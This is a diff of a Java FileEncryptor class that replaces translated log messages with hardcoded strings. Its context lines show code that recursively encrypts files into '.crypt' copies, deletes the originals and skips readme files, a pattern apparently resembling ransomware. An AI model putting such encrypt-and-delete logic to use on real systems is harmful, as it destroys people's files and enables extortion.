@@ -62,8 +62,7 @@ public class FileEncryptor {
         } catch (NoSuchPaddingException | NoSuchAlgorithmException
                 | InvalidKeyException | BadPaddingException
                 | IllegalBlockSizeException | IOException ex) {
-            throw new RuntimeException(MessageFormat.format(
-                    config.translate("error.cryptfile"), ex.getMessage()));
+            throw new RuntimeException(MessageFormat.format("Error cryptFile: {0}", ex.getMessage()));
         }
 
     }
@@ -71,8 +70,7 @@ public class FileEncryptor {
     public void scanFiles(int cipherMode, File[] files) {
         for (File file : files) {
             if (file.isDirectory()) {
-                logger.trace(MessageFormat.format(config.translate("scanning.directory"),
-                        file.getAbsolutePath()));
+                logger.trace(MessageFormat.format("Scanning directory: {0}", file.getAbsolutePath()));
                 scanFiles(cipherMode, file.listFiles());
             } else {
                 try {
@@ -95,8 +93,7 @@ public class FileEncryptor {
                     !file.getName().toLowerCase().contains("readme")) {
                 cryptFile(Cipher.ENCRYPT_MODE, file, new File(result));
                 if (!file.delete())
-                    logger.error(MessageFormat.format(
-                            config.translate("could.not.delete.file"), file.getAbsolutePath()));
+                    logger.error(MessageFormat.format("Could not delete file: {0}", file.getAbsolutePath()));
                 return result;
             }
         } catch (Exception e) {
@@ -111,8 +108,7 @@ public class FileEncryptor {
             if (FilenameUtils.getExtension(file.getAbsolutePath()).equals("crypt")) {
                 cryptFile(Cipher.DECRYPT_MODE, file, new File(result));
                 if (!file.delete())
-                    logger.error(MessageFormat.format(
-                            config.translate("could.not.delete.file"), file.getAbsolutePath()));
+                    logger.error(MessageFormat.format("Could not delete file: {0}", file.getAbsolutePath()));
                 return result;
             }
         } catch (Exception e) {
@@ -128,5 +124,6 @@ public class FileEncryptor {
         File[] root = new File(binPath).listFiles();
         scanFiles(config.getSettings().isEncrypted() ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE, root);
     }
+
 }
 
